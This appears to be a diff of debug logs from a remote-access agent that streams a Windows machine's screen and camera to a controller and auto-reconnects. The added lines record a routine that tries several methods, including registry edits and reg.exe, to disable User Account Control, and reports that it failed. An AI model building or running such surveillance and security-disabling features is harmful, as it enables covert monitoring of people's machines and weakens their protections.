-2025-12-28 06:29:59,767 - INFO - ScreenTrack initialized for agent DESKTOP-8SOSPFT at 30 FPS
-[INFO] Added screen track to WebRTC connection for agent DESKTOP-8SOSPFT
-2025-12-28 06:29:59,780 - INFO - Added screen track to WebRTC connection for agent DESKTOP-8SOSPFT
-[INFO] WebRTC peer connection created successfully for agent DESKTOP-8SOSPFT
-2025-12-28 06:29:59,781 - INFO - WebRTC peer connection created successfully for agent DESKTOP-8SOSPFT
-[INFO] ICE gathering state: gathering for agent DESKTOP-8SOSPFT
-2025-12-28 06:29:59,808 - INFO - ICE gathering state: gathering for agent DESKTOP-8SOSPFT
-2025-12-28 06:29:59,809 - INFO - Connection(1) Could not bind to 169.254.255.5 - [WinError 10049] The requested address is not valid in its context
-2025-12-28 06:29:59,812 - INFO - Connection(1) Could not bind to 169.254.15.107 - [WinError 10049] The requested address is not valid in its context
-2025-12-28 06:29:59,814 - INFO - Connection(1) Could not bind to 169.254.175.61 - [WinError 10049] The requested address is not valid in its context
-[INFO] ICE gathering state: complete for agent DESKTOP-8SOSPFT
-2025-12-28 06:30:04,818 - INFO - ICE gathering state: complete for agent DESKTOP-8SOSPFT
-[INFO] WebRTC offer created for agent DESKTOP-8SOSPFT
-2025-12-28 06:30:04,818 - INFO - WebRTC offer created for agent DESKTOP-8SOSPFT
-[INFO] WebRTC offer sent to controller for agent DESKTOP-8SOSPFT
-2025-12-28 06:30:04,819 - INFO - WebRTC offer sent to controller for agent DESKTOP-8SOSPFT
-[INFO] WebRTC streaming started for agent DESKTOP-8SOSPFT
-2025-12-28 06:30:04,820 - INFO - WebRTC streaming started for agent DESKTOP-8SOSPFT
-[INFO] Camera stream: 18.1 FPS, 0.5 MB/s, 1350 frames total
-2025-12-28 06:30:04,826 - INFO - Camera stream: 18.1 FPS, 0.5 MB/s, 1350 frames total
-[INFO] [AGENT ID] Using hostname as agent ID: DESKTOP-8SOSPFT
-2025-12-28 06:30:04,828 - INFO - [AGENT ID] Using hostname as agent ID: DESKTOP-8SOSPFT
-[WARNING] Could not save agent ID to file: [Errno 13] Permission denied: 'C:\\Users\\Brylle\\AppData\\Roaming\\agent_controller\\agent_id.txt'
-2025-12-28 06:30:04,829 - WARNING - Could not save agent ID to file: [Errno 13] Permission denied: 'C:\\Users\\Brylle\\AppData\\Roaming\\agent_controller\\agent_id.txt'
-[INFO] [AGENT ID] Using hostname as agent ID: DESKTOP-8SOSPFT
-2025-12-28 06:30:04,829 - INFO - [AGENT ID] Using hostname as agent ID: DESKTOP-8SOSPFT
-[WARNING] Could not save agent ID to file: [Errno 13] Permission denied: 'C:\\Users\\Brylle\\AppData\\Roaming\\agent_controller\\agent_id.txt'
-2025-12-28 06:30:04,830 - WARNING - Could not save agent ID to file: [Errno 13] Permission denied: 'C:\\Users\\Brylle\\AppData\\Roaming\\agent_controller\\agent_id.txt'
-[ERROR] Error closing WebRTC connection: Event loop is closed
-2025-12-28 06:30:05,592 - ERROR - Error closing WebRTC connection: Event loop is closed
-[INFO] ICE connection state: closed for agent DESKTOP-8SOSPFT
-2025-12-28 06:30:05,593 - INFO - ICE connection state: closed for agent DESKTOP-8SOSPFT
-[INFO] WebRTC connection state changed to closed for agent DESKTOP-8SOSPFT
-2025-12-28 06:30:05,593 - INFO - WebRTC connection state changed to closed for agent DESKTOP-8SOSPFT
-[ERROR] Failed to stop WebRTC streaming for agent DESKTOP-8SOSPFT
-2025-12-28 06:30:05,594 - ERROR - Failed to stop WebRTC streaming for agent DESKTOP-8SOSPFT
-[INFO] [STREAM] Using simple Socket.IO stream (compat mode)
-2025-12-28 06:30:06,283 - INFO - [STREAM] Using simple Socket.IO stream (compat mode)
-[INFO] Started simple Socket.IO screen stream (compat mode).
-2025-12-28 06:30:06,286 - INFO - Started simple Socket.IO screen stream (compat mode).
-[INFO] Camera stream: 11.1 FPS, 0.3 MB/s, 1378 frames total
-2025-12-28 06:30:54,286 - INFO - Camera stream: 11.1 FPS, 0.3 MB/s, 1378 frames total
-[INFO] Started smart video streaming (WebRTC preferred, Socket.IO fallback).
-2025-12-28 06:30:54,287 - INFO - Started smart video streaming (WebRTC preferred, Socket.IO fallback).
-[INFO] [AGENT ID] Using hostname as agent ID: DESKTOP-8SOSPFT
-2025-12-28 06:30:54,288 - INFO - [AGENT ID] Using hostname as agent ID: DESKTOP-8SOSPFT
-[WARNING] Could not save agent ID to file: [Errno 13] Permission denied: 'C:\\Users\\Brylle\\AppData\\Roaming\\agent_controller\\agent_id.txt'
-2025-12-28 06:30:54,288 - WARNING - Could not save agent ID to file: [Errno 13] Permission denied: 'C:\\Users\\Brylle\\AppData\\Roaming\\agent_controller\\agent_id.txt'
-[INFO] 📢 Notification emitted: Screen Stream Started (system)
-2025-12-28 06:30:54,289 - INFO - 📢 Notification emitted: Screen Stream Started (system)
-[INFO] [AGENT ID] Using hostname as agent ID: DESKTOP-8SOSPFT
-2025-12-28 06:30:54,637 - INFO - [AGENT ID] Using hostname as agent ID: DESKTOP-8SOSPFT
-[WARNING] Could not save agent ID to file: [Errno 13] Permission denied: 'C:\\Users\\Brylle\\AppData\\Roaming\\agent_controller\\agent_id.txt'
-2025-12-28 06:30:54,638 - WARNING - Could not save agent ID to file: [Errno 13] Permission denied: 'C:\\Users\\Brylle\\AppData\\Roaming\\agent_controller\\agent_id.txt'
-[INFO] [AGENT ID] Using hostname as agent ID: DESKTOP-8SOSPFT
-2025-12-28 06:31:24,840 - INFO - [AGENT ID] Using hostname as agent ID: DESKTOP-8SOSPFT
-[WARNING] Could not save agent ID to file: [Errno 13] Permission denied: 'C:\\Users\\Brylle\\AppData\\Roaming\\agent_controller\\agent_id.txt'
-2025-12-28 06:31:24,840 - WARNING - Could not save agent ID to file: [Errno 13] Permission denied: 'C:\\Users\\Brylle\\AppData\\Roaming\\agent_controller\\agent_id.txt'
-[INFO] Camera stream: 8.9 FPS, 0.3 MB/s, 1380 frames total
-2025-12-28 06:31:24,847 - INFO - Camera stream: 8.9 FPS, 0.3 MB/s, 1380 frames total
-[INFO] Stopped video stream.
-2025-12-28 06:31:26,077 - INFO - Stopped video stream.
-[INFO] [AGENT ID] Using hostname as agent ID: DESKTOP-8SOSPFT
-2025-12-28 06:31:26,078 - INFO - [AGENT ID] Using hostname as agent ID: DESKTOP-8SOSPFT
-[WARNING] Could not save agent ID to file: [Errno 13] Permission denied: 'C:\\Users\\Brylle\\AppData\\Roaming\\agent_controller\\agent_id.txt'
-2025-12-28 06:31:26,078 - WARNING - Could not save agent ID to file: [Errno 13] Permission denied: 'C:\\Users\\Brylle\\AppData\\Roaming\\agent_controller\\agent_id.txt'
-[INFO] 📢 Notification emitted: Screen Stream Stopped (system)
-2025-12-28 06:31:26,079 - INFO - 📢 Notification emitted: Screen Stream Stopped (system)
-[INFO] Stopped camera stream.
-2025-12-28 06:31:27,242 - INFO - Stopped camera stream.
-[INFO] [AGENT ID] Using hostname as agent ID: DESKTOP-8SOSPFT
-2025-12-28 06:31:27,243 - INFO - [AGENT ID] Using hostname as agent ID: DESKTOP-8SOSPFT
-[WARNING] Could not save agent ID to file: [Errno 13] Permission denied: 'C:\\Users\\Brylle\\AppData\\Roaming\\agent_controller\\agent_id.txt'
-2025-12-28 06:31:27,244 - WARNING - Could not save agent ID to file: [Errno 13] Permission denied: 'C:\\Users\\Brylle\\AppData\\Roaming\\agent_controller\\agent_id.txt'
-[INFO] 📢 Notification emitted: Camera Stream Stopped (system)
-2025-12-28 06:31:27,244 - INFO - 📢 Notification emitted: Camera Stream Stopped (system)
-[INFO] Camera capture stopped
-2025-12-28 06:31:27,811 - INFO - Camera capture stopped
-[INFO] Camera encoding stopped
-2025-12-28 06:31:27,827 - INFO - Camera encoding stopped
-[INFO] Camera sending stopped
-2025-12-28 06:31:27,827 - INFO - Camera sending stopped
-[INFO] [AGENT ID] Using hostname as agent ID: DESKTOP-8SOSPFT
-2025-12-28 06:31:30,804 - INFO - [AGENT ID] Using hostname as agent ID: DESKTOP-8SOSPFT
-[WARNING] Could not save agent ID to file: [Errno 13] Permission denied: 'C:\\Users\\Brylle\\AppData\\Roaming\\agent_controller\\agent_id.txt'
-2025-12-28 06:31:30,805 - WARNING - Could not save agent ID to file: [Errno 13] Permission denied: 'C:\\Users\\Brylle\\AppData\\Roaming\\agent_controller\\agent_id.txt'
-[INFO] [DISCONNECT] Agent DESKTOP-8SOSPFT lost connection to controller
-2025-12-28 06:31:30,805 - INFO - [DISCONNECT] Agent DESKTOP-8SOSPFT lost connection to controller
-[INFO] [DISCONNECT] Stopping all active streams and commands...
-2025-12-28 06:31:30,806 - INFO - [DISCONNECT] Stopping all active streams and commands...
-[INFO] [AGENT ID] Using hostname as agent ID: DESKTOP-8SOSPFT
-2025-12-28 06:31:30,806 - INFO - [AGENT ID] Using hostname as agent ID: DESKTOP-8SOSPFT
-[WARNING] Could not save agent ID to file: [Errno 13] Permission denied: 'C:\\Users\\Brylle\\AppData\\Roaming\\agent_controller\\agent_id.txt'
-2025-12-28 06:31:30,807 - WARNING - Could not save agent ID to file: [Errno 13] Permission denied: 'C:\\Users\\Brylle\\AppData\\Roaming\\agent_controller\\agent_id.txt'
-[INFO] 📢 Notification emitted: Agent Disconnected (system)
-2025-12-28 06:31:30,809 - INFO - 📢 Notification emitted: Agent Disconnected (system)
-[INFO] [CLEANUP] Stopping all active operations...
-2025-12-28 06:31:30,809 - INFO - [CLEANUP] Stopping all active operations...
-[INFO] [AGENT ID] Using hostname as agent ID: DESKTOP-8SOSPFT
-2025-12-28 06:31:30,809 - INFO - [AGENT ID] Using hostname as agent ID: DESKTOP-8SOSPFT
-[WARNING] Could not save agent ID to file: [Errno 13] Permission denied: 'C:\\Users\\Brylle\\AppData\\Roaming\\agent_controller\\agent_id.txt'
-2025-12-28 06:31:30,810 - WARNING - Could not save agent ID to file: [Errno 13] Permission denied: 'C:\\Users\\Brylle\\AppData\\Roaming\\agent_controller\\agent_id.txt'
-[ERROR] Error closing WebRTC connection: Task <Task pending name='Task-26' coro=<stop_webrtc_streaming.<locals>.cleanup_webrtc() running at C:\Users\Brylle\controller-ef5fecd17b20484d5f4acc58d78bf9d83da689ad\client.py:7888> cb=[_run_until_complete_cb() at C:\Users\Brylle\AppData\Local\Programs\Python\Python313\Lib\asyncio\base_events.py:181]> got Future <Future pending> attached to a different loop
-2025-12-28 06:31:30,812 - ERROR - Error closing WebRTC connection: Task <Task pending name='Task-26' coro=<stop_webrtc_streaming.<locals>.cleanup_webrtc() running at C:\Users\Brylle\controller-ef5fecd17b20484d5f4acc58d78bf9d83da689ad\client.py:7888> cb=[_run_until_complete_cb() at C:\Users\Brylle\AppData\Local\Programs\Python\Python313\Lib\asyncio\base_events.py:181]> got Future <Future pending> attached to a different loop
-[ERROR] Failed to stop WebRTC streaming for agent DESKTOP-8SOSPFT
-2025-12-28 06:31:30,813 - ERROR - Failed to stop WebRTC streaming for agent DESKTOP-8SOSPFT
-[INFO] [CLEANUP] WebRTC streaming stopped
-2025-12-28 06:31:30,814 - INFO - [CLEANUP] WebRTC streaming stopped
-[INFO] [CLEANUP] All operations stopped
-2025-12-28 06:31:30,814 - INFO - [CLEANUP] All operations stopped
-[INFO] [DISCONNECT] Cleanup complete - will auto-reconnect
-2025-12-28 06:31:30,815 - INFO - [DISCONNECT] Cleanup complete - will auto-reconnect
-[INFO] [AGENT ID] Using hostname as agent ID: DESKTOP-8SOSPFT
-2025-12-28 06:31:33,068 - INFO - [AGENT ID] Using hostname as agent ID: DESKTOP-8SOSPFT
-[WARNING] Could not save agent ID to file: [Errno 13] Permission denied: 'C:\\Users\\Brylle\\AppData\\Roaming\\agent_controller\\agent_id.txt'
-2025-12-28 06:31:33,068 - WARNING - Could not save agent ID to file: [Errno 13] Permission denied: 'C:\\Users\\Brylle\\AppData\\Roaming\\agent_controller\\agent_id.txt'
-[INFO] [CONNECT] Connected to controller, registering agent DESKTOP-8SOSPFT
-2025-12-28 06:31:33,069 - INFO - [CONNECT] Connected to controller, registering agent DESKTOP-8SOSPFT
-[INFO] [HEALTH_MONITOR] ❌ Connection LOST - initiating cleanup...
-2025-12-28 06:31:33,080 - INFO - [HEALTH_MONITOR] ❌ Connection LOST - initiating cleanup...
-[INFO] [CLEANUP] Stopping all active operations...
-2025-12-28 06:31:33,082 - INFO - [CLEANUP] Stopping all active operations...
-[INFO] [AGENT ID] Using hostname as agent ID: DESKTOP-8SOSPFT
-2025-12-28 06:31:33,083 - INFO - [AGENT ID] Using hostname as agent ID: DESKTOP-8SOSPFT
-[WARNING] Could not save agent ID to file: [Errno 13] Permission denied: 'C:\\Users\\Brylle\\AppData\\Roaming\\agent_controller\\agent_id.txt'
-2025-12-28 06:31:33,084 - WARNING - Could not save agent ID to file: [Errno 13] Permission denied: 'C:\\Users\\Brylle\\AppData\\Roaming\\agent_controller\\agent_id.txt'
-[ERROR] Error closing WebRTC connection: await wasn't used with future
-2025-12-28 06:31:33,086 - ERROR - Error closing WebRTC connection: await wasn't used with future
-[ERROR] Failed to stop WebRTC streaming for agent DESKTOP-8SOSPFT
-2025-12-28 06:31:33,087 - ERROR - Failed to stop WebRTC streaming for agent DESKTOP-8SOSPFT
-[INFO] [CLEANUP] WebRTC streaming stopped
-2025-12-28 06:31:33,087 - INFO - [CLEANUP] WebRTC streaming stopped
-[INFO] [CLEANUP] All operations stopped
-2025-12-28 06:31:33,087 - INFO - [CLEANUP] All operations stopped
-[INFO] [HEALTH_MONITOR] Triggering forced reconnection...
-2025-12-28 06:31:33,087 - INFO - [HEALTH_MONITOR] Triggering forced reconnection...
-[INFO] [AGENT ID] Using hostname as agent ID: DESKTOP-8SOSPFT
-2025-12-28 06:31:33,879 - INFO - [AGENT ID] Using hostname as agent ID: DESKTOP-8SOSPFT
-[WARNING] Could not save agent ID to file: [Errno 13] Permission denied: 'C:\\Users\\Brylle\\AppData\\Roaming\\agent_controller\\agent_id.txt'
-2025-12-28 06:31:33,880 - WARNING - Could not save agent ID to file: [Errno 13] Permission denied: 'C:\\Users\\Brylle\\AppData\\Roaming\\agent_controller\\agent_id.txt'
-[INFO] 📢 Notification emitted: Agent Connected (system)
-2025-12-28 06:31:33,880 - INFO - 📢 Notification emitted: Agent Connected (system)
-[INFO] [HEALTH_MONITOR] ✅ Connection ACTIVE
-2025-12-28 06:31:34,089 - INFO - [HEALTH_MONITOR] ✅ Connection ACTIVE
+[DEBUG]
+[UAC DISABLE] Trying method 1/4...
+[DEBUG] [UAC DISABLE] Method 1: Direct registry modification...
+[DEBUG] [X] [UAC DISABLE] Method 1 FAILED: [WinError 5] Access is denied
+[DEBUG]
+[UAC DISABLE] Trying method 2/4...
+[DEBUG] [UAC DISABLE] Method 2: reg.exe command...
+[DEBUG] [OK] [UAC DISABLE] Method 2 SUCCESS!
+[DEBUG] [UAC DISABLE] Method 2 succeeded! Verifying...
+[DEBUG]
+[UAC DISABLE] Verifying final status...
+[DEBUG] ================================================================================
+[DEBUG] [UAC VERIFY] Current UAC Status:
+[DEBUG]   EnableLUA: 1 (0=Disabled, 1=Enabled)
+[DEBUG]   ConsentPromptBehaviorAdmin: 2
+[DEBUG]     0 = No prompts (DISABLED)
+[DEBUG]     1 = Password required (STRICT)
+[DEBUG]     5 = Just click Yes (CONSENT)
+[DEBUG]   PromptOnSecureDesktop: 1 (0=Off, 1=On)
+[DEBUG]   ⚪ STATUS: Custom mode (ConsentPromptBehaviorAdmin=2)
+[DEBUG] ================================================================================
+[DEBUG] ================================================================================
+[DEBUG] [X][X][X] [UAC DISABLE] FAILED!
+[DEBUG] [X] Could not disable UAC with any method
+[DEBUG] [X] May need administrator privileges
+[DEBUG] ================================================================================
+[DEBUG] [X] [UAC] UAC disable FAILED!
